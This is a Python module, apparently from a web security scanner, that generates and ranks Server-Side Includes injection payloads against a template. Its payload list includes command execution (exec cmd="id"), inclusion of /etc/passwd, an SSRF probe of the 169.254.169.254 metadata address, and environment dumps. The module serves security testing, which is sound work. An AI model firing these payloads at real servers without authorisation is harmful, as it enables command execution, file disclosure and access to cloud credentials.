"""Server-Side Includes (SSI) injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_ssi_context

_BODIES = [
    ('<!--#exec cmd="id" -->', "exec-cmd"),
    ('<!--#exec cgi="/cgi-bin/x" -->', "exec-cgi"),
    ('<!--#include virtual="/etc/passwd" -->', "include-file"),
    ('<!--#include virtual="http://169.254.169.254/" -->', "include-ssrf"),
    ('<!--#echo var="DOCUMENT_ROOT" -->', "echo"),
    ("<!--#printenv -->", "printenv"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class SsiCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class SsiMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[SsiCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_ssi(template: str) -> SsiMutationResult:
    """Generate and rank SSI injection payloads for ``template``."""
    from .analyzer import analyze_ssi

    context = analyze_ssi_context(template)

    candidates: list[SsiCandidate] = []
    for payload, strategy in _BODIES:
        result = analyze_ssi(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                SsiCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return SsiMutationResult(
        template=template,
        context=context,
        generated=len(_BODIES),
        valid=len(candidates),
        candidates=candidates,
    )
